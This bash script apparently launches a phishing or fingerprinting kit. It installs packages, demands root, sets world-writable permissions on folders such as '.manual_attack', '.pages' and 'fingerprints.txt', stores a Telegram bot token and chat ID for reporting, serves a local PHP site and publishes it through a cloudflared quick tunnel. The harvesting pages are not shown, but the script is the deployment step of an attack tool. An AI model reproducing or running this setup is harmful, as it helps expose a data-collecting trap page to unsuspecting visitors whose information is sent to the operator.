#!/bin/bash

install_packages_and_tunnels() {
    if [[ -f .host/cloudflared ]]; then
        clear
    else
        clear
        if [[ $(uname -o) != Android ]]; then
            bash packages.sh
            bash tunnels.sh
        else
            ./packages.sh
            ./tunnels.sh
        fi
    fi
}

check_root_and_os() {
    if [[ $(uname -o) != Android && ${EUID:-$(id -u)} -ne 0 ]]; then
        clear
        echo -e "The program cannot run.\nFor GNU/Linux systems, please run as root.\n"
        exit 1
    fi
}

set_permissions() {
    chmod -R 777 packages.sh tunnels.sh data.txt fingerprints.txt .host .manual_attack .music .pages .tunnels_log .www
}

create_or_update_config() {
    config_file=".www/config.ini"
    if [[ -f $config_file ]]; then
        read -p "config.ini already exists. Do you want to update it? (y/n): " choice
        if [[ $choice != "y" ]]; then
            echo "Config update skipped."
            return
        fi
    fi

    read -p "Enter your Telegram bot token: " token
    read -p "Enter your Telegram chat ID: " chat_id

    cat <<EOL >$config_file
[telegram]
token = $token
chat_id = $chat_id
EOL

    echo "Config file created/updated successfully."
}

start_php_server() {
    cd .www && php -S 127.0.0.1:8080 > /dev/null 2>&1 &
}

start_cloudflared() {
    echo -ne "\nStarting Cloudflared..."
    if [[ $(command -v termux-chroot) ]]; then
        termux-chroot ./.host/cloudflared tunnel -url 127.0.0.1:8080 > .tunnels_log/.cloudfl.log 2>&1 &
    else
        ./.host/cloudflared tunnel -url 127.0.0.1:8080 > .tunnels_log/.cloudfl.log 2>&1 &
    fi

    sleep 12
    cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' .tunnels_log/.cloudfl.log)
    echo -e "\nCloudflared URL: ${cldflr_url}"
}

install_packages_and_tunnels
check_root_and_os
set_permissions
create_or_update_config
start_php_server
start_cloudflared
